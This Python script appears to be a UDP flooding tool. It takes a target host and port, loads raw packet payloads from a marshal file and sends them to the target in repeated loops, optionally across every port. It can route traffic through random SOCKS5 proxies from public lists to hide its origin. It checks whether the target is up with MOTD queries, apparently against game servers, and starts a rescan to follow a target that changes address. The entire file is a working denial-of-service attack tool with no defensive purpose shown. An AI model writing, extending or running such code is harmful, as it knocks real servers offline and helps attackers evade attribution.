import marshal
import random
import socket
import subprocess
import sys
import time
import os
from motd import sendPacket as sendMotdPacket
from api import getLocalHostIP, getTime, log

try:
    import wget
    import socks
    import requests
except:
    log("Import module error! Please run \"pip install -r requirements.txt\"")
    os._exit(1)

localHostIP = getLocalHostIP()


def getOptions():
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        file = sys.argv[3]
        loops = sys.argv[4]
        interval = sys.argv[5]
        isDisplayMotd = sys.argv[6]
        proxyUsed = sys.argv[7]
    except:
        target = input("Target(IP/Domain): ")
        port = input("Port(Number): ")
        file = input("File(Path): ")
        loops = input("Loops(Number): ")
        interval = input("Interval(sec): ")
        isDisplayMotd = input("Display Motd(y/n): ")
        proxyUsed = input("Proxy(y/n): ")
    proxyCountry = ""
    if proxyUsed == "y":
        try:
            proxyCountry = sys.argv[8]
        except:
            proxyCountry = input("ProxyCountry(like cn, ru, us or enter to use all): ")
        log(f"Proxy mode is under development and deprecated!")
        proxyUsed = True
    else:
        proxyUsed = False

    if isDisplayMotd == "y":
        isDisplayMotd = True
    else:
        isDisplayMotd = False
    print()
    return target, int(port), file, int(loops), float(interval), proxyUsed, isDisplayMotd, proxyCountry




def getProxy() -> list:
    try:
        log(f"Trying to get proxy data from api...")
        proxyInfo = requests.get(
            f"https://www.proxyscan.io/api/proxy?last_check=3600&uptime=&ping=&limit=1&type=socks5&format=json&country={proxyCountry}").json()
        proxyIP = proxyInfo[0]['Ip']
        proxyPort = proxyInfo[0]['Port']
        return proxyIP, int(proxyPort)
    except:
        if not os.path.exists(r"socks5.txt"):
            log(f"Request api failed. Downloading proxy list...")
            wget.download(
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
            print()
            log(f"Proxy list downloaded!")
        with open("socks5.txt", "r") as file:
            socksList = file.readlines()
            randomIndex = random.randint(0, len(socksList) - 1)
            proxy = socksList[randomIndex]
            proxyIP, proxyPort = proxy.rsplit(':', 1)
            #log(proxyIP, ":", proxyPort)
            return proxyIP, int(proxyPort)


def createSocket():
    localPort = random.randint(1024, 65535)
    proxyIP, proxyPort = None, None
    if proxyUsed:
        socketSend = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        proxyIP, proxyPort = getProxy()
        socketSend.set_proxy(socks.SOCKS5, proxyIP, proxyPort)
        if proxyUsed:
            log(f"Used proxy: {proxyIP}:{proxyPort}")
    else:
        socketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socketSend.bind((str(localHostIP), localPort))
    return localPort, socketSend


def sendPacket(target: str, port, payloadFile: str, loops, interval):
    targetAddr = target
    autoScan = port
    targetFile, targetInfo = target.split(":")
    targetFileToScan = targetFile
    scanProcess = False
    for i in range(loops):
        if ":" in target:
            with open(targetFile, "r") as file: #, encoding="utf-8"
                fileContent = file.readlines()
                contentCount = len(fileContent)
                for index in range(contentCount):
                    # print(contentCount)
                    # print(index)
                    info = fileContent[contentCount-index-1]
                    if targetInfo in info:
                        log("Found target info:")
                        log(info)
                        targetAddr = info.split(" | ")[2]
                        port = info.split(" | ")[3]
                        break
        try:
            localPort, socketSend = createSocket()
        except:
            continue
        payloads = None
        try:
            payloads = marshal.load(open(payloadFile, "rb"))
        except:
            log(f"Payload file {payloadFile} not found!")
            sys.exit()
        try:
            if isDisplayMotd:
                sendMotdPacket(targetAddr, port)
                if scanProcess:
                    scanProcess.kill()
                    scanProcess = False
        except:
            if isDisplayMotd:
                if ":" in target and int(autoScan) == 8:
                    if not scanProcess:
                        log(f"Target server offline.")
                        log(f"Starting refresh ip list...")
                        scanProcess = subprocess.Popen(["python", "scan.py", targetFileToScan, "10000-21000", "nn", "0", targetFileToScan])
                        targetFile = "updated.txt"
                else:
                    log(f"Target server offline.")
                #log(f"Sending packet...")
        try:
            if port == "*":
                for port in range(65535):
                    for line in payloads:
                        socketSend.sendto(line, (targetAddr, port))
            else:
                for line in payloads:
                    socketSend.sendto(line, (targetAddr, int(port)))
            log(f"Loop ", str(i),
                  " done, used local port: ", str(localPort), "\n")
        except:
            log(f"Loop ", str(i), " error! Skip...", "\n")
            pass
        if i+1 < loops:
            time.sleep(interval)


if __name__ == "__main__":
    target, port, file, loops, interval, proxyUsed, isDisplayMotd, proxyCountry = getOptions()
    sendPacket(target, port, file, loops, interval)
